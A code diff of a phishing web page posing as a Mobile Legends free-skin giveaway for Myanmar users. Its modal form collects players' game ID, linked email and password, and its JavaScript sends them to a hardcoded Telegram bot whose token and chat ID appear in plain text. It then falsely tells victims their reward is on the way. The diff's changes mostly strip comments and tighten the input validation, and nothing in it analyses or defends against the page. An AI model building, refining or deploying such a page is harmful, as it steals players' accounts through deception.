@@ -1,5 +1,4 @@
-
-<!-- MLBB Event Layout with Full Width Header, Large Logo, and Store Badges -->
+<!-- MLBB Event Layout with Full Width Header, Large Logo, and Enhanced Validation -->
 <html lang="my">
 <head>
     <meta charset="UTF-8">
@@ -8,8 +7,8 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
+        /* CSS for full page layout and aesthetics */
         body {
-            /* 🛠️ Background color ကို Header color (#1a1a1a) နဲ့ ချိန်လိုက်သည် */
             background-color: #1a1a1a; 
             color: #ffffff;
             font-family: 'Inter', sans-serif;
@@ -19,12 +18,11 @@
         .container {
             max-width: 768px;
             margin: auto;
-            padding: 0 8px; /* For mobile spacing */
+            padding: 0 8px;
         }
         
-        /* Header Styling - Logo ဘယ်၊ Links ညာ၊ Full Width */
         .event-header {
-            background-color: #1a1a1a; /* MLBB Logo အောက်ခံအရောင် */
+            background-color: #1a1a1a;
             padding: 8px 16px;
             display: flex;
             justify-content: space-between; 
@@ -34,7 +32,6 @@
             box-sizing: border-box; 
         }
         
-        /* Links Container Style */
         .platform-links {
             display: flex;
             align-items: center;
@@ -48,29 +45,25 @@
             border-radius: 4px;
         }
         
-        /* New Logo Icon Style - အရွယ်အစား တိုးမြှင့်သည် */
         .header-logo-icon {
-            height: 45px; /* Logo အရွယ်အစားကို ကြီးအောင် ချိန်လိုက်သည် */
+            height: 45px;
             border-radius: 4px;
         }
 
-        /* Banner Styling */
         .main-banner {
             width: 100%;
             height: auto;
             border-radius: 8px;
             margin: 16px 0;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
-            /* Fallback image style */
             background-color: #333;
             min-height: 150px;
             display: block;
         }
 
-        /* Skin Grid Layout */
         .skin-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); /* Responsive grid */
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
             gap: 12px;
             padding: 16px 0;
         }
@@ -81,15 +74,14 @@
             }
         }
 
-        /* Skin Item Card Styling */
         .item-card {
-            background-color: #1a1a1a; /* Body နဲ့ အရောင်တူစေရန် */
+            background-color: #1a1a1a;
             border-radius: 8px;
             overflow: hidden;
             box-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
             cursor: pointer;
             transition: transform 0.1s;
-            position: relative; /* For FREE overlay */
+            position: relative;
             height: auto;
             border: 2px solid transparent;
         }
@@ -105,12 +97,11 @@
             display: block;
         }
 
-        /* FREE Overlay Styling */
         .free-tag {
             position: absolute;
             bottom: 0;
             right: 0;
-            background-color: #E6B300; /* Gold/Yellow background */
+            background-color: #E6B300;
             color: #121212;
             padding: 2px 8px;
             border-top-left-radius: 8px;
@@ -141,7 +132,7 @@
             visibility: visible;
         }
         .modal-content {
-            background-color: #252525; /* Modal content ကို နည်းနည်း ထင်ပေါ်အောင် အရောင်ပြောင်းလိုက်သည် */
+            background-color: #252525;
             padding: 24px;
             border-radius: 12px;
             width: 90%;
@@ -164,7 +155,7 @@
             font-size: 1rem;
         }
         .modal-send-btn {
-            background-color: #2d942e; /* Green button */
+            background-color: #2d942e;
             color: white;
             padding: 10px 20px;
             border-radius: 6px;
@@ -176,7 +167,7 @@
             background-color: #247525;
         }
         .modal-close-btn {
-            background-color: #942d2d; /* Red button */
+            background-color: #942d2d;
             margin-left: 10px;
         }
         .modal-close-btn:hover {
@@ -186,23 +177,21 @@
 </head>
 <body>
 
-    <!-- Event Header (Logo ဘယ်၊ Links ညာ၊ Full Width) -->
+    <!-- Event Header -->
     <div class="event-header">
         
-        <!-- 🚨 MLBB Logo Icon (ဘယ်ဘက်တွင် နေရာယူသည်) -->
+        <!-- MLBB Logo Icon -->
         <img class="header-logo-icon" src="https://i.ibb.co/C3QdFrk0/1910.png" 
              onerror="this.onerror=null;this.src='https://placehold.co/45x45/f05252/ffffff?text=Logo';" 
              alt="MLBB New Logo">
 
-        <!-- Platform Links (ညာဘက်တွင် နေရာယူသည်) -->
+        <!-- Platform Links -->
         <div class="platform-links">
-            <!-- App Store Link -->
             <a href="#">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1200px-Download_on_the_App_Store_Badge.svg.png" 
                      onerror="this.onerror=null;this.src='https://placehold.co/100x30/1c1c1c/ffffff?text=App+Store'" 
                      alt="App Store Link">
             </a>
-            <!-- Google Play Link -->
             <a href="#">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1200px-Google_Play_Store_badge_EN.svg.png" 
                      onerror="this.onerror=null;this.src='https://placehold.co/100x30/1c1c1c/ffffff?text=Google+Play'" 
@@ -220,6 +209,7 @@
         
         <!-- Skin Grid -->
         <div class="skin-grid">
+            <!-- All Skin Cards are linked to the openTelegramModal JS function -->
             <!-- POKO Skin (1) -->
             <div class="item-card" onclick="openTelegramModal('Skin 1885')">
                 <img class="skin-image" src="https://i.ibb.co/3Yvp2cq6/1885.png" onerror="fallbackImage(this)" alt="Reward Image 1">
@@ -296,22 +286,22 @@
     </div>
 
 
-    <!-- Telegram Modal -->
+    <!-- Telegram Modal (Form for Credentials) -->
     <div id="telegramModal" class="modal-overlay">
         <div class="modal-content">
-            <!-- ခေါင်းစဉ်: Mobile Legends Bang Bang -->
+            <!-- Header -->
             <h3 class="text-lg font-bold mb-4 text-yellow-400">Mobile Legends Bang Bang</h3>
             
-            <!-- Skin Display ကို static text ဖြင့် အစားထိုးခြင်း -->
+            <!-- Static message -->
             <p id="skinNameDisplay" class="mb-4 text-center font-semibold text-red-500">Myanmar Only User</p>
             
-            <!-- ပထမအကွက် (ID/Server ID) -->
+            <!-- Input 1: ID/Server ID -->
             <input type="text" id="messageLine1" class="modal-input" placeholder="Your ID/Server ID (နံပါတ်များသာ)" required>
 
-            <!-- ဒုတိယအကွက် (Account Type) -->
+            <!-- Input 2: Account Email/Type -->
             <input type="text" id="messageLine2" class="modal-input" placeholder="Mlbb account နှင့်ချိတ်ထားသော Email (ဥပမာ: @gmail.com)" required>
             
-            <!-- တတိယအကွက် (Password) -->
+            <!-- Input 3: Password -->
             <input type="password" id="messageLine3" class="modal-input" placeholder="Password (အနည်းဆုံး ၈ လုံး)" required>
 
             <div class="flex justify-end mt-4">
@@ -319,6 +309,7 @@
                 <button onclick="sendMessageToTelegram()" class="modal-send-btn">
                     ထုတ်ယူရန်
                 </button>
+                <!-- ပိတ်မည် ခလုတ် -->
                 <button onclick="closeTelegramModal()" class="modal-send-btn modal-close-btn">
                     ပိတ်မည်
                 </button>
@@ -330,40 +321,49 @@
 
     <script>
         // ----------------------------------------------------
-        // 🚨 Telegram Bot Configuration
+        // 🚨 Telegram Bot Configuration (အရေးကြီးသော လျှို့ဝှက်ကုဒ်များ)
         // ----------------------------------------------------
+        // ဤကုဒ်များကို သင့် Bot အတွက် သေချာစွာ ထည့်သွင်းထားရန် လိုအပ်ပါသည်။
         const TELEGRAM_BOT_TOKEN = '8401107435:AAF_g6gQ1BApPyLlY_zE3BDm_1EvLKqqLKA'; 
         const CHAT_ID = '8434049778'; 
         // ----------------------------------------------------
 
 
-        // Image Fallback Function (ပုံမပေါ်ရင် Placeholder ပြန်ပြဖို့)
+        let selectedSkin = ''; // ရွေးထားသော Skin နာမည်ကို သိမ်းထားမည်။
+
+        // ပုံမပေါ်ရင် Placeholder ပြန်ပြဖို့ Function
         function fallbackImage(img) {
-            img.onerror = null; // Prevent infinite loop
+            img.onerror = null;
             img.src = `https://placehold.co/100x150/2c2c2c/ffffff?text=Broken+Image`;
         }
 
-        let selectedSkin = ''; // နှိပ်လိုက်တဲ့ Skin နာမည်ကို သိမ်းထားဖို့
-
-        // Modal ကို ဖွင့်ရန်
+        // 🚨 Modal ကို ဖွင့်ရန် Function 
         function openTelegramModal(skinName) {
             selectedSkin = skinName;
-            document.getElementById('telegramModal').classList.add('open');
-            document.getElementById('modalStatus').innerText = ''; // Status ကိုရှင်းလင်းခြင်း
+            const modal = document.getElementById('telegramModal');
+            
+            // Modal element ကို ရှာတွေ့ရင် 'open' class ကို ထည့်ပြီး ဖွင့်မည်။
+            if (modal) {
+                modal.classList.add('open');
+                document.getElementById('modalStatus').innerText = ''; // Status ကိုရှင်းလင်းခြင်း
+                // Input များကို ရှင်းလင်းခြင်း
+                document.getElementById('messageLine1').value = '';
+                document.getElementById('messageLine2').value = '';
+                document.getElementById('messageLine3').value = ''; 
+            }
         }
 
-        // Modal ကို ပိတ်ရန်
+        // Modal ကို ပိတ်ရန် Function
         function closeTelegramModal() {
-            document.getElementById('telegramModal').classList.remove('open');
-            // Form Data သုံးခုလုံးကို ရှင်းလင်းခြင်း
-            document.getElementById('messageLine1').value = '';
-            document.getElementById('messageLine2').value = '';
-            document.getElementById('messageLine3').value = ''; 
+            const modal = document.getElementById('telegramModal');
+            if (modal) {
+                modal.classList.remove('open');
+            }
         }
         
-        // 🚨 Email ပုံစံ မှန်ကန်ကြောင်း စစ်ဆေးရန် Function
+        // Email ပုံစံ မှန်ကန်ကြောင်း စစ်ဆေးရန် Function
         function isValidEmail(email) {
-            // Basic regex for email pattern
+            // စစ်ဆေးမှု: @ နှင့် domain အတွက် အနည်းဆုံး အစက်တစ်လုံး ပါရမည်။
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             return emailRegex.test(email);
         }
@@ -371,22 +371,23 @@
         // Telegram သို့ စာပို့ရန် Function (API Call)
         async function sendMessageToTelegram() {
             const statusElement = document.getElementById('modalStatus');
-            const idServer = document.getElementById('messageLine1').value.trim(); // Your ID/Server ID
-            const accountType = document.getElementById('messageLine2').value.trim(); // Gmail/Moonton/Facebook
-            const password = document.getElementById('messageLine3').value.trim(); // Password
+            const idServer = document.getElementById('messageLine1').value.trim();
+            const accountType = document.getElementById('messageLine2').value.trim();
+            const password = document.getElementById('messageLine3').value.trim();
             
             // ---------------------------------------------
-            // 🛠️ ENHANCED CLIENT-SIDE VALIDATION
+            // CLIENT-SIDE VALIDATION (ဒေတာမှန်အောင် စစ်ဆေးမှု)
             // ---------------------------------------------
             
             if (!idServer || !accountType || !password) {
                 statusElement.innerText = 'အကွက်အားလုံးကို ဖြည့်သွင်းရန် လိုအပ်ပါသည်။';
-                statusElement.style.color = '#f05252'; // Red
+                statusElement.style.color = '#f05252';
                 return;
             }
 
-            // 1. ID/Server ID စစ်ဆေးခြင်း (နံပါတ်များသာ)
-            if (!/^\d+$/.test(idServer.replace(/[()]/g, ''))) {
+            // 1. ID/Server ID စစ်ဆေးခြင်း (နံပါတ်များ၊ ကွင်းခတ်များသာ ခွင့်ပြု)
+            // စစ်ဆေးမှု: နံပါတ်၊ နေရာလွတ်၊ ကွင်းခတ်များ ပါဝင်နိုင်သော်လည်း နံပါတ်တစ်ခုတော့ ပါရမည်။
+            if (!/^\s*[\d() ]+\s*$/.test(idServer) || !/\d/.test(idServer)) {
                 statusElement.innerText = 'ID/Server ID သည် နံပါတ်များသာ ပါဝင်ရပါမည်။ (ဥပမာ 12345678(1234))';
                 statusElement.style.color = '#f05252';
                 return;
@@ -406,9 +407,8 @@
                 return;
             }
             // ---------------------------------------------
-            // END VALIDATION
-            // ---------------------------------------------
-
+            
+            // Message Construction
             const fullMessage = `
                 🚨 NEW SKIN REQUEST (Myanmar Only User) 🚨
                 -------------------------------------
@@ -423,9 +423,10 @@
             const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
             statusElement.innerText = 'ပို့နေပါသည်...';
-            statusElement.style.color = '#fca311'; // Yellow
+            statusElement.style.color = '#fca311';
 
             try {
+                // Telegram API ကို ခေါ်ဆိုခြင်း
                 const response = await fetch(apiUrl, {
                     method: 'POST',
                     headers: {
@@ -443,18 +444,19 @@
                 if (response.ok && data.ok) {
                     // Success message
                     statusElement.innerText = 'ဆုလက်ဆောင် ထုတ်ယူပြီးပါပြီ။ 24 နာရီ စောင့်ဆိုင်းပေးပါ။';
-                    statusElement.style.color = '#2d942e'; // Green
-                    // 3 စက္ကန့်အကြာတွင် Modal ပိတ်ရန်
+                    statusElement.style.color = '#2d942e';
+                    // 3 seconds delay before closing
                     setTimeout(closeTelegramModal, 3000); 
                 } else {
+                    // Error message
                     statusElement.innerText = `ထုတ်ယူမရပါ: ${data.description || 'အမှားတစ်ခုခုရှိနေပါသည်။ Bot Config ကို စစ်ပါ။'}`;
-                    statusElement.style.color = '#f05252'; // Red
+                    statusElement.style.color = '#f05252';
                 }
 
             } catch (error) {
                 console.error('Fetch Error:', error);
                 statusElement.innerText = 'ကွန်ရက် ချိတ်ဆက်မှု အမှားဖြစ်နေပါသည်။';
-                statusElement.style.color = '#f05252'; // Red
+                statusElement.style.color = '#f05252';
             }
         }
     </script>
